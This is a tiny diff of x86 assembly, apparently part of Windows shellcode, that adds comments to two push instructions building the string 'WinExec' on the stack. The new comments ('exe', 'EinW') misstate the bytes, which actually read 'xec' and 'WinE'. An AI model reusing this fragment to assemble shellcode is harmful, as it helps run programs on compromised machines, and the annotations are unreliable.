@@ -126,8 +126,8 @@ pop    edi
 # ? xor and push really necessary?
 #   xor    ecx,ecx
 #   push   ecx
-push   0x00636578
-push   0x456e6957
+push   0x00636578 #  exe
+push   0x456e6957 # EinW
 
 mov    ecx,esp
 
